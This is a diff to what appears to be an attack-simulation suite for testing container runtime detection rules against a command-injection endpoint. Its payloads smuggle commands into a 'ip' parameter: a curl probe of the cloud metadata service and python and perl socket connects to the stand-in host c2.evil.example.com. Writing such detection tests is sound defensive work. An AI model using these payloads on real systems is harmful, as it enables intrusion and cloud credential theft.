@@ -38,11 +38,22 @@ attacks:
     http:
       method: GET
       path: /ping.php
+      # PR119 rabbit: previously the payload was just "169.254.169.254"
+      # which only ping'd the link-local IP; T1552.005 requires HITTING the
+      # IMDS endpoint. Force the cmdinject path to actually fetch
+      # /latest/meta-data/ via curl (the SSRF probe). This makes the
+      # success indicator meaningful AND lets us assert R0001 for curl.
       queryParams:
-        ip: "169.254.169.254"
+        ip: "127.0.0.1;curl -s --max-time 2 http://169.254.169.254/latest/meta-data/ 2>&1 | head -5; echo metadata_probe_done"
     successIndicators:
-      - statusCode: 200
-    expectedDetections: []
+      - bodyContains: "metadata_probe_done"
+    # The curl exec is the universal signal — IMDS may be unreachable in
+    # the cluster network, but the syscall trace shows the probe.
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: mywebapp-app
+        command: curl
 
   # ═══════════════════════════════════════════════════════════════════════════
   # Phase 3: EXECUTION (TA0002) — Command injection via ping.php
@@ -500,9 +511,13 @@ attacks:
       method: GET
       path: /ping.php
       queryParams:
-        ip: "127.0.0.1;python3 -c \"import socket,os;s=socket.socket();s.settimeout(2);s.connect(('c2.evil.example.com',4444))\" 2>/dev/null || python -c \"print('python_not_available')\" 2>/dev/null || echo no_python"
+        # PR119 rabbit: each branch ends with a unique marker so the success
+        # indicator can verify which branch actually executed (the bare
+        # status:200 check let the `echo no_python` fallback pass even when
+        # neither interpreter ran).
+        ip: "127.0.0.1;python3 -c \"import socket,os,sys;s=socket.socket();s.settimeout(2);s.connect(('c2.evil.example.com',4444));print('PYTHON3_RAN')\" 2>/dev/null || python -c \"print('PYTHON2_RAN')\" 2>/dev/null || echo NO_PYTHON_INTERPRETER"
     successIndicators:
-      - statusCode: 200
+      - bodyRegex: "(PYTHON3_RAN|PYTHON2_RAN|NO_PYTHON_INTERPRETER)"
     # Image may have python3 OR python (or neither). Assert both — whichever
     # exec lands, R0001 catches it as unexpected. Matches the bash and perl
     # reverse-shell probes elsewhere in this suite.
@@ -549,9 +564,11 @@ attacks:
       method: GET
       path: /ping.php
       queryParams:
-        ip: "127.0.0.1;perl -e 'use IO::Socket::INET;my $s=IO::Socket::INET->new(PeerAddr=>\"c2.evil.example.com\",PeerPort=>4444,Proto=>\"tcp\",Timeout=>2);if($s){print \"connected\"}else{print \"perl_connect_failed\"}' 2>/dev/null || echo no_perl"
+        # PR119 rabbit: branch-specific markers so we can tell whether perl
+        # actually ran or the suite just hit the no-interpreter fallback.
+        ip: "127.0.0.1;perl -e 'use IO::Socket::INET;my $s=IO::Socket::INET->new(PeerAddr=>\"c2.evil.example.com\",PeerPort=>4444,Proto=>\"tcp\",Timeout=>2);if($s){print \"PERL_CONNECTED\"}else{print \"PERL_RAN_NO_CONNECT\"}' 2>/dev/null || echo NO_PERL_INTERPRETER"
     successIndicators:
-      - statusCode: 200
+      - bodyRegex: "(PERL_CONNECTED|PERL_RAN_NO_CONNECT|NO_PERL_INTERPRETER)"
     expectedDetections:
       - ruleID: R0001
         ruleName: Unexpected process launched
